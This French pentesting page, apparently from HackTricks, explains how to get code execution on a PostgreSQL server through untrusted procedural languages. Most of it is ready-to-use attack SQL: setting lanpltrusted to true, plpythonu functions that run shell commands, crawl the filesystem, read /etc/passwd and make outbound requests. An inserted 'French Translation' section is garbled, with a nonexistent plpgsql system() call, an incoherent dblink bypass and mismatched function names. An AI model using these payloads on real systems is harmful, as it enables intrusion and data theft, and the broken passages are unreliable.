## Langages PostgreSQL

La base de données PostgreSQL à laquelle vous avez accès peut avoir différents **langages de script installés** que vous pouvez exploiter pour **exécuter du code arbitraire**.

Vous pouvez les **faire fonctionner** :
```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```
La plupart des langages de script que vous pouvez installer dans PostgreSQL ont **2 versions**: la version **de confiance** et la version **non de confiance**. La version **non de confiance** aura un nom **terminant par "u"** et sera la version qui vous permettra d'**exécuter du code** et d'utiliser d'autres fonctions intéressantes. Voici des langages qui, s'ils sont installés, sont intéressants:

* **plpythonu**
* **plpython3u**
* **plperlu**
* **pljavaU**
* **plrubyu**
* ... (tout autre langage de programmation utilisant une version non sécurisée)

{% hint style="warning" %}
Si vous trouvez qu'un langage intéressant est **installé** mais **non de confiance** par PostgreSQL (**`lanpltrusted`** est **`false`**), vous pouvez essayer de **lui faire confiance** avec la ligne suivante afin qu'aucune restriction ne soit appliquée par PostgreSQL:
```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```
{% endhint %}

{% hint style="danger" %}
Si vous ne voyez pas une langue, vous pouvez essayer de la charger avec (**vous devez être superadmin**):
```
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```
{% endhint %}

Notez qu'il est possible de compiler les versions sécurisées en "non sécurisées". Consultez [**ce lien**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) par exemple. Il vaut donc toujours la peine d'essayer si vous pouvez exécuter du code même si vous ne trouvez que la version **de confiance** installée.

## plpythonu/plpython3u

{% tabs %}
{% tab title="RCE" %}
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
{% endtab %}

{% tab title="Obtenir l'utilisateur du système d'exploitation" %}
```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```
{% endtab %}

{% tab title="List dir" %}Lister le répertoire{% endtab %}
```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import json
    from os import walk
    files = next(walk(dir), (None, None, []))
    return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```
{% endtab %}

{% tab title="Trouver le dossier W" %}
```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        writables = []
        def find_writable(path):
            if not os.path.isdir(path):
                return
            if os.access(path, os.W_OK):
                writables.append(path)
            if not os.listdir(path):
                return
            else:
                for item in os.listdir(path):
                    find_writable(os.path.join(path, item))
        find_writable(path)
        return writables
    
    return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```
{% endtab %}

{% tab title="Trouver un fichier" %}
```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in os.path.basename(i):
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```
{% endtab %}

{% tab title="Trouver des exécutables" %}
```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find(dir)
    b = []

    for i in a:
        b.append(os.path.basename(i))
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```
{% endtab %}

{% tab title="Trouver exec par subs" %}
```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in i:
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```
{% endtab %}

{% tab title="French Translation" %}
# RCE avec les langages PostgreSQL

Il est possible d'exécuter du code arbitraire en utilisant les langages de programmation pris en charge par PostgreSQL. Pour cela, il faut que l'utilisateur ait les privilèges nécessaires pour créer des fonctions dans la base de données.

## Création d'une fonction

La première étape consiste à créer une fonction qui exécute le code que nous voulons. Par exemple, pour exécuter la commande `id`, nous pouvons créer la fonction suivante :

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
    BEGIN
        RETURN '' || system('id') || '';
    END;
$$ LANGUAGE plpgsql;
```

Cette fonction utilise la fonction `system()` pour exécuter la commande `id` et renvoyer le résultat.

## Exécution de la fonction

Une fois que la fonction est créée, nous pouvons l'exécuter en utilisant la commande `SELECT`. Par exemple :

```sql
SELECT rce();
```

Cela exécutera la fonction `rce()` et renverra le résultat de la commande `id`.

## Utilisation de langages de programmation supplémentaires

PostgreSQL prend en charge plusieurs langages de programmation, notamment PL/Python, PL/Perl et PL/Tcl. Pour utiliser ces langages, il faut les installer et les activer dans la base de données.

Par exemple, pour utiliser PL/Python, il faut installer le module `plpython3u` et activer la langue dans la base de données :

```sql
CREATE EXTENSION plpython3u;
```

Ensuite, nous pouvons créer une fonction qui utilise le langage PL/Python pour exécuter du code Python :

```sql
CREATE OR REPLACE FUNCTION rce_python() RETURNS text AS $$
    import subprocess
    return subprocess.check_output(['id']).decode()
$$ LANGUAGE plpython3u;
```

Cette fonction utilise le module `subprocess` pour exécuter la commande `id` et renvoyer le résultat.

Nous pouvons ensuite l'exécuter en utilisant la commande `SELECT` :

```sql
SELECT rce_python();
```

Cela exécutera la fonction `rce_python()` et renverra le résultat de la commande `id`.

## Contournement des restrictions de sécurité

Dans certains cas, l'utilisateur peut ne pas avoir les privilèges nécessaires pour créer des fonctions dans la base de données. Dans ce cas, il est possible d'utiliser une fonction existante qui a les privilèges nécessaires.

Par exemple, la fonction `dblink_connect()` peut être utilisée pour se connecter à une autre base de données. Cette fonction a les privilèges nécessaires pour exécuter du code arbitraire dans la base de données distante.

Nous pouvons utiliser cette fonction pour exécuter du code arbitraire dans la base de données locale en créant une fonction qui se connecte à la base de données locale et exécute le code :

```sql
CREATE OR REPLACE FUNCTION rce_dblink() RETURNS text AS $$
    SELECT dblink_connect('host=localhost user=postgres password=postgres dbname=postgres');
    SELECT dblink_exec('SELECT * FROM rce()');
$$ LANGUAGE sql;
```

Cette fonction se connecte à la base de données locale en utilisant les informations d'identification par défaut et exécute la fonction `rce()` en utilisant la fonction `dblink_exec()`. Le résultat est renvoyé à la base de données distante.

Nous pouvons ensuite exécuter cette fonction dans la base de données distante en utilisant la commande `SELECT` :

```sql
SELECT rce_dblink();
```

Cela exécutera la fonction `rce_dblink()` et renverra le résultat de la commande `id`.
```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import base64
    encoded_string= base64.b64encode(open(path).read())
    return encoded_string.decode('utf-8')
    return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```
{% endtab %}

{% tab title="Obtenir les permissions" %}
```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    status = os.stat(path)
    perms = oct(status.st_mode)[-3:]
    return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```
{% endtab %}

{% tab title="Requête" %}
```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    import urllib
    r = urllib.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    from urllib import request
    r = request.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
## pgSQL

Consultez la page suivante:

{% content-ref url="pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## C

Consultez la page suivante:

{% content-ref url="rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](rce-with-postgresql-extensions.md)
{% endcontent-ref %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
